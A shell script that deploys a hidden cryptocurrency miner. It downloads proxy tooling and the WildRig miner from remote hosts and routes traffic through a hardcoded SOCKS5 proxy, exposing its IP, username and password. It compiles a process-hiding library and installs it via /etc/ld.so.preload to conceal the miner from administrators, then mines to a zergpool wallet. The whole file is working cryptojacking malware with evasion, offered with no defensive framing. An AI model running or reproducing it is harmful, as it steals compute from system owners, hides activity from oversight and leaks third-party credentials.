#!/bin/sh
sleep 5m
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo " "

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "

echo " "
echo " "

./graftcp/graftcp wget https://github.com/andru-kun/wildrig-multi/releases/download/0.31.3/wildrig-multi-linux-0.31.3.tar.xz
tar -xf wildrig-multi-linux-0.31.3.tar.xz
chmod +x wildrig-multi

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./graftcp/graftcp ./wildrig-multi --algo skein2 --opencl-threads auto --opencl-launch auto --url stratum+tcp://skein2.asia.mine.zergpool.com:5233 --user WcMvYA7WuwcGD8ywcreYsw2xXofdnPsGNC --pass x
